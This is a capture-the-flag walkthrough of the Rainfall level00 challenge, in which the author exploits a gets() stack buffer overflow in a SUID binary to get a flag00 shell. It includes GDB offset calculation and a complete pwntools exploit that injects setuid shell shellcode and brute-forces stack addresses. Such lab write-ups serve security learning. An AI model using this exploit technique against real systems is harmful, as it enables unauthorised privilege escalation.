# Rainfall — Level00 Walkthrough

## 1. Understanding the program

I started by connecting to the Rainfall VM as `level00`.

In my home directory, I found an executable called `case` and its source code, `case.c`.

First, I checked the executable's permissions:

```bash
ls -l case
```

Output:

```text
-rwsr-x--- 1 flag00 level00 16792 Jun 9 23:13 ./case
```

I noticed that the executable belongs to `flag00` and has the SUID bit enabled.

This means that when I execute the program, it runs with the effective permissions of `flag00`.

My goal was to exploit the program to obtain a shell with `flag00` privileges and read `/home/flag00/.pass`.

## 2. Finding the vulnerability

I started by reading `case.c` to understand how the program handles user input.

Inside the authentication function, I found:

```c
char credentials[64];
```

The program reads the user's input with:

```c
gets(credentials);
```

The problem is that `gets()` does not check how many bytes are written into the buffer.

Since `credentials` is only 64 bytes long, sending more than 64 bytes can overwrite other values stored on the stack.

This creates a **stack-based buffer overflow**.

My idea was to use this vulnerability to overwrite the saved return address and redirect the program's execution.

## 3. Finding the offset

I used GDB to inspect the `auth_loop` function.

In the disassembly, I found:

```asm
sub rsp, 0x50
lea rax, [rbp-0x50]
call gets
```

The buffer starts at:

```text
rbp - 0x50
```

The saved return address is located at:

```text
rbp + 8
```

So I calculated the distance between the beginning of the buffer and the return address:

```text
0x50 + 8 = 0x58 = 88 bytes
```

This means I need to send **88 bytes before reaching the saved return address**.

The offset is larger than the 64-byte buffer because of the way the compiler organized the local variables and reserved space on the stack.

## 4. Confirming control of the return address

Before trying to open a shell, I wanted to make sure I could actually control the return address.

I found the `print_banner()` function at:

```text
0x401455
```

I created a small Python script:

```python
import sys

payload = b"A" * 88
payload += (0x401455).to_bytes(8, "little")

sys.stdout.buffer.write(payload + b"\n")
```

Then I ran:

```bash
python3 poc.py | ./case
```

The program displayed its banner a second time before crashing.

This confirmed that my 88-byte offset was correct and that I could overwrite the return address.

I used little-endian encoding because x86-64 stores multi-byte addresses with the least significant byte first.

## 5. Creating the shellcode

Now that I could control the return address, I wanted to execute code that would open a shell.

I used Python with pwntools instead of writing the assembly manually.

I generated the shellcode with:

```python
shellcode = asm(shellcraft.setreuid() + shellcraft.sh())
```

Here:

- `shellcraft.setreuid()` generates code to set the real and effective user IDs using the current effective UID.
- `shellcraft.sh()` generates code to launch `/bin/sh`.
- `asm()` converts the assembly into machine-code bytes.

The UID part is important because `case` is a SUID executable. I wanted the shell to keep the privileges of `flag00`.

I also added NOP instructions:

```python
b"\x90" * 32
```

A NOP is an instruction that does nothing. Placing several NOPs before the shellcode creates a small landing area.

## 6. Finding the buffer address

I needed to know approximately where my injected code would be located in memory.

I launched GDB:

```bash
gdb -nx -q ./case
```

Then I placed a breakpoint before the call to `gets()`:

```gdb
break *0x401596
run
```

I displayed the address of the buffer:

```gdb
p/x $rbp-0x50
```

Output:

```text
$1 = 0x7fffffffe1e0
```

This gave me the address of `credentials` during that execution.

However, the address of the stack can be slightly different when running the program outside GDB.

That became the main problem with my first attempts.

## 7. Building the final exploit

I first tried using the address found in GDB directly, but the program crashed with a segmentation fault.

The shellcode was not necessarily at the same address during a normal execution.

Instead of manually guessing addresses, I decided to automate the process.

I wrote a Python script that starts from an address found in GDB and tests nearby addresses until one works.

Here is my final `poc.py`:

```python
from pwn import *

context.arch = "amd64"
context.log_level = "error"

shellcode = asm(shellcraft.setreuid() + shellcraft.sh())

base = 0x7fffffffe248

for offset in range(-0x2000, 0x2001, 16):
    address = base + offset

    payload = b"A" * 88
    payload += p64(address)
    payload += b"\x90" * 32
    payload += shellcode

    if b"\n" in payload:
        continue

    p = process("./case")

    try:
        p.sendlineafter(b"Enter credentials: ", payload)
        p.sendline(b"id")

        output = p.recvrepeat(0.1)

        if b"uid=" in output:
            print("Shell found!", hex(address))
            print(output.decode(errors="replace"))
            p.interactive()
            break

    except EOFError:
        pass

    p.close()
else:
    print("No working address found in the tested range.")
```

### How it works

The script starts with:

```python
base = 0x7fffffffe248
```

This address was calculated from the buffer location observed in GDB.

Then I used a loop:

```python
for offset in range(-0x2000, 0x2001, 16):
```

This tests nearby addresses, moving 16 bytes between each attempt.

For every address, I build a payload containing:

```text
88 bytes of padding
8 bytes for the new return address
32 NOP instructions
Shellcode
```

The padding reaches the saved return address.

Then:

```python
payload += p64(address)
```

replaces it with the address I want to test.

The `p64()` function converts the address into an 8-byte little-endian value.

After that, I add the NOP instructions and the shellcode.

I also check that the payload does not contain `\n`, because `gets()` stops reading at a newline.

For each attempt, the script launches a new instance of the vulnerable program:

```python
p = process("./case")
```

It sends the payload and then tries to execute:

```bash
id
```

If the output contains `uid=`, the script considers the attempt successful and switches to interactive mode.

This approach is basically a small brute-force search over nearby stack addresses.

## 8. Getting the flag00 shell

I launched my exploit:

```bash
python3 poc.py
```

After testing several addresses, the script found one that worked:

```text
Shell found! 0x7fffffffe288
```

The output also showed:

```text
uid=1017(flag00) gid=1003(level00) groups=1003(level00),1001(levelgroup)
```

This confirmed that I had successfully obtained a shell with the UID of `flag00`.

The program still displayed:

```text
[SPRAWL//NET] Access denied.
```

But the authentication result did not matter anymore.

Even though the credentials were rejected, the buffer overflow allowed me to redirect execution when the function returned.

I then navigated to the `flag00` directory:

```bash
cd ..
cd flag00
ls -la
```

I found the protected `.pass` file:

```text
-r-------- 1 flag00 flag00 33 Jun 9 23:13 .pass
```

Finally, I read it:

```bash
cat .pass
```

I successfully recovered the password needed for the next level.

## 9. Conclusion

In this level, I exploited a stack-based buffer overflow caused by the unsafe `gets()` function.

I first analyzed the program and identified the vulnerability. Then I used GDB to calculate the 88-byte offset needed to overwrite the return address.

I confirmed that I could redirect execution by making the program call `print_banner()` again.

After that, I generated shellcode with pwntools to launch a shell with the privileges of `flag00`.

The main difficulty was finding a working return address outside GDB.

I solved this by writing a Python script that automatically tested nearby addresses until it found one that worked.

In the end, I obtained a shell with `flag00` privileges and read the protected `.pass` file.

This level helped me understand how a buffer overflow can be used to overwrite a return address, redirect execution, and exploit a SUID executable.
